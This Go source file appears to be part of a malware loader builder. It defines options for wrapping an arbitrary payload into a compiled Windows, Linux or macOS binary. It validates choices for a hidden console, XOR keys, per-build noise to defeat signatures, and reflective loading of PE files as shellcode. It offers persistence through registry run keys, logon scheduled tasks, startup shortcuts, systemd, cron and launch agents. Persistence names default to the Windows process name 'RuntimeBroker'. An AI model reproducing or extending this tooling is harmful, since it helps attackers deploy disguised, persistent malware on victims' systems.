package loader

import (
	"encoding/binary"
	"fmt"
	"strings"
	"unicode"
)

const (
	MaxPayload = 64 << 20
	PersistOff = "off"
)

// Options is a compile-on-host loader build.
type Options struct {
	Payload     []byte
	GOOS        string
	GOARCH      string
	Name        string
	HideConsole bool
	Persistence string
	PersistName string
	XORKey      string
	// Per-build uniqueness, filled by Build. Not API inputs.
	Nonce   []byte
	Noise   []byte
	NameKey byte
	BuildID string
}

// Result is the compiled binary plus the options it was built with.
type Result struct {
	Filename    string `json:"filename"`
	DataB64     string `json:"data_b64"`
	Size        int    `json:"size"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	HideConsole bool   `json:"hide_console"`
	Persistence string `json:"persistence"`
	RDI         bool   `json:"rdi"`
	PayloadSize int    `json:"payload_size"`
}

var persistByOS = map[string][]string{
	"windows": {PersistOff, "runkey_hkcu", "schtask_logon", "startup_lnk", "all"},
	"linux":   {PersistOff, "systemd_user", "cron", "all"},
	"darwin":  {PersistOff, "launchagent"},
}

func (o *Options) Normalize() error {
	if o == nil {
		return fmt.Errorf("missing options")
	}
	o.GOOS = NormalizeOS(o.GOOS)
	o.GOARCH = NormalizeArch(o.GOARCH)
	if o.GOOS == "" {
		o.GOOS = "windows"
	}
	if o.GOARCH == "" {
		o.GOARCH = "amd64"
	}
	if _, ok := persistByOS[o.GOOS]; !ok {
		return fmt.Errorf("unsupported os %q (windows, linux, darwin)", o.GOOS)
	}
	switch o.GOARCH {
	case "amd64", "386", "arm64", "arm":
	default:
		return fmt.Errorf("unsupported arch %q", o.GOARCH)
	}
	if o.Persistence == "" {
		o.Persistence = PersistOff
	}
	o.Persistence = strings.ToLower(strings.TrimSpace(o.Persistence))
	if !persistAllowed(o.GOOS, o.Persistence) {
		return fmt.Errorf("persistence %q is not valid for %s", o.Persistence, o.GOOS)
	}
	o.Name = sanitizeIdent(o.Name, "payload")
	o.PersistName = sanitizeIdent(o.PersistName, "RuntimeBroker")
	if len(o.Payload) == 0 {
		return fmt.Errorf("payload is empty")
	}
	if len(o.Payload) > MaxPayload {
		return fmt.Errorf("payload is %d bytes; max is %d", len(o.Payload), MaxPayload)
	}
	return nil
}

func persistAllowed(goos, method string) bool {
	for _, m := range persistByOS[goos] {
		if m == method {
			return true
		}
	}
	return false
}

// Filename is the download name for a compiled loader.
func Filename(name, goos string) string {
	base := sanitizeIdent(name, "payload") + "_loader"
	if NormalizeOS(goos) == "windows" {
		return base + ".exe"
	}
	return base
}

// NormalizeOS maps common aliases onto GOOS values.
func NormalizeOS(s string) string {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "", "win", "windows", "win32", "win64":
		if s == "" {
			return ""
		}
		return "windows"
	case "linux":
		return "linux"
	case "darwin", "macos", "osx", "mac":
		return "darwin"
	default:
		return strings.ToLower(strings.TrimSpace(s))
	}
}

// NormalizeArch maps common aliases onto GOARCH values.
func NormalizeArch(s string) string {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "x86_64", "x64", "amd64":
		return "amd64"
	case "x86", "i386", "i686", "386":
		return "386"
	case "aarch64", "arm64":
		return "arm64"
	case "armv7", "armv6", "arm":
		return "arm"
	default:
		return strings.ToLower(strings.TrimSpace(s))
	}
}

func sanitizeIdent(s, fallback string) string {
	var b strings.Builder
	for _, r := range s {
		if unicode.IsLetter(r) || unicode.IsDigit(r) || r == '-' || r == '_' {
			b.WriteRune(r)
		}
	}
	out := b.String()
	if out == "" {
		return fallback
	}
	if out[0] == '-' || (out[0] >= '0' && out[0] <= '9') {
		out = "p" + out
	}
	if len(out) > 64 {
		out = out[:64]
	}
	return out
}

// LooksLikePE reports an MZ header (Windows EXE or DLL).
func LooksLikePE(b []byte) bool {
	return len(b) >= 2 && b[0] == 'M' && b[1] == 'Z'
}

// LooksLikeFullPE reports a DOS MZ header plus a PE signature.
func LooksLikeFullPE(b []byte) bool {
	if !LooksLikePE(b) || len(b) < 0x40 {
		return false
	}
	off := int(binary.LittleEndian.Uint32(b[0x3c:0x40]))
	if off < 0 || off+4 > len(b) {
		return false
	}
	return b[off] == 'P' && b[off+1] == 'E' && b[off+2] == 0 && b[off+3] == 0
}

// LooksLikeELF reports an ELF header.
func LooksLikeELF(b []byte) bool {
	return len(b) >= 4 && b[0] == 0x7f && b[1] == 'E' && b[2] == 'L' && b[3] == 'F'
}

// NeedsRDI is true when a Windows wrap would try to run a PE/DLL as shellcode.
func NeedsRDI(goos string, payload []byte) bool {
	return NormalizeOS(goos) == "windows" && LooksLikePE(payload)
}
